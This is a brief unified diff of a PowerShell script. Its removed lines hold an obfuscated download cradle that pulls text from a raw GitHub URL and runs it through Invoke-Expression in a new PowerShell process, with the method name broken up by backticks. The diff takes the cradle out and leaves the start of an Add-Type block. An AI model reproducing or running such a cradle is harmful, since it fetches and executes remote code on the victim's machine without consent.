@@ -1,6 +1,4 @@
-$shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/vm.txt")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
+
 
 Add-Type -TypeDefinition @"
 using System;
